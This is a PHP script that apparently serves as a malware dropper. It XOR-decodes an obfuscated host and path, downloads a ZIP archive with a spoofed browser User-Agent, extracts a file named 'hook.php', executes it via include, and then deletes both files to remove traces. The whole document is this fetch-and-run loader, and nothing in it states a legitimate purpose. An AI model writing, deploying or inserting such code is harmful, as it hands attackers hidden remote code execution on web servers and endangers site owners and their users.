<?php
// --- Decryption Function ---
function xorDecrypt($encryptedData, $key) {
    $decryptedOutput = '';
    $keyLength = strlen($key);
    for ($i = 0; $i < strlen($encryptedData); $i++) {
        $decryptedOutput .= chr(ord($encryptedData[$i]) ^ ord($key[$i % $keyLength]));
    }
    return $decryptedOutput;
}

/**
 * Downloads a file from a URL using cURL.
 * This is more reliable than file_get_contents() as it sets a proper User-Agent.
 *
 * @param string $url The URL to download from.
 * @return string|false The downloaded data on success, or false on failure.
 */
function downloadFileWithCurl($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Return the response as a string
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Follow redirects
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'); // Mimic a real browser
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // Keep SSL verification on for security
    curl_setopt($ch, CURLOPT_TIMEOUT, 30); // Set a 30-second timeout

    $data = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);

    // Check for cURL errors or non-successful HTTP status codes
    if ($data === false || $httpCode !== 200) {
        error_log("cURL Error: Failed to download from $url. HTTP Code: $httpCode. cURL Error: $error");
        return false;
    }

    return $data;
}

// --- Decrypted Data ---
 $secretKey = "!";
 $hostname = xorDecrypt("FHUITCBNL", $secretKey);
 $path = xorDecrypt("xTB@DSHORHLQMDBLE@OEC@BJENNSS@VSDGRID@ERL@HOCP[HQ", $secretKey);

// --- URL and Filename Construction ---
 $url = "https://" . $hostname . $path;
 $localZipFile = 'tmp.zip';
 $fileToExecuteInsideZip = 'hook.php'; // The file to be extracted and executed

echo "Target URL: " . $url . "\n";

// --- Step 1: Check for ZIP extension ---
if (!extension_loaded('zip')) {
    die("ERROR: PHP 'zip' extension is not enabled.");
}

// --- Step 2: Download the ZIP file using cURL ---
echo "Downloading file...\n";
 $downloadedData = downloadFileWithCurl($url); // Use the new cURL function
if ($downloadedData === false) {
    die("ERROR: Failed to download file from URL. The URL may be invalid, or your server may be blocking the request.");
}

// --- Step 3: Save the ZIP file to the server ---
echo "Saving file to '$localZipFile'...\n";
 $bytesWritten = file_put_contents($localZipFile, $downloadedData);
if ($bytesWritten === false) {
    die("ERROR: Failed to save file to disk. Check directory permissions.");
}

// --- Step 4: Extract the desired file ---
echo "Extracting '$fileToExecuteInsideZip' from '$localZipFile'...\n";
 $zip = new ZipArchive;

if ($zip->open($localZipFile) === TRUE) {
    if ($zip->extractTo(__DIR__, $fileToExecuteInsideZip)) {
        echo "File '$fileToExecuteInsideZip' extracted successfully.\n";
    } else {
        $zip->close();
        die("ERROR: Failed to extract '$fileToExecuteInsideZip' from ZIP.");
    }
    $zip->close();
} else {
    die("ERROR: Failed to open '$localZipFile' as a valid ZIP archive.");
}

// --- Step 5: Execute the extracted PHP file ---
echo "Executing file '$fileToExecuteInsideZip'...\n";
include $fileToExecuteInsideZip;

// --- Step 6: Cleanup (VERY IMPORTANT) ---
if (file_exists($fileToExecuteInsideZip)) {
    unlink($fileToExecuteInsideZip);
    echo "File '$fileToExecuteInsideZip' has been deleted.\n";
}
if (file_exists($localZipFile)) {
    unlink($localZipFile);
    echo "File '$localZipFile' has been deleted.\n";
}

echo "Process finished.\n";
?>